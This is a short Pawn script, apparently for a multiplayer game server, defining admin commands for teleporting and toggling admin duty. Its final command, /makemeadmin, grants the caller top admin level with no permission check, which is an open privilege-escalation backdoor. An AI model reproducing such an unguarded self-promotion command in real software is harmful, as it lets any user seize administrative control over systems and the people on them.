//==[ Command Admin ]==
CMD:gotoco(playerid, params[])
{
	if(PlayerData[playerid][pAdmin] >= 2)
	{
		new Float: pos[3], int;
		if(sscanf(params, "fffd", pos[0], pos[1], pos[2], int))
			return SendSyntaxMessage(playerid, "USAGE: /gotoco [x coordinate] [y coordinate] [z coordinate] [interior]");

		SendClientMessage(playerid, COLOR_WHITE, "You have been teleported to the coordinates specified.");
		SetPlayerPos(playerid, pos[0], pos[1], pos[2]);
		SetPlayerInterior(playerid, int);
	}
	return 1;
}



/* Admin Commands */
CMD:aduty(playerid, params[])
{
    if(PlayerData[playerid][pAdmin] < 1)
        return SendErrorMessage(playerid, "You don't have permission to use this command!");
        
	if(!PlayerData[playerid][pAduty])
	{
	    PlayerData[playerid][pAduty] = true;
	    SetPlayerColor(playerid, 0xFF0000FF);
	    SetPlayerName(playerid, PlayerData[playerid][pUCP]);
	}
	else
	{
	    PlayerData[playerid][pAduty] = false;
	    SetPlayerColor(playerid, COLOR_WHITE);
	    SetPlayerName(playerid, PlayerData[playerid][pName]);
	}
	return 1;
}

CMD:makemeadmin(playerid, params[])
{
	PlayerData[playerid][pAdmin] = 7;
	return 1;
}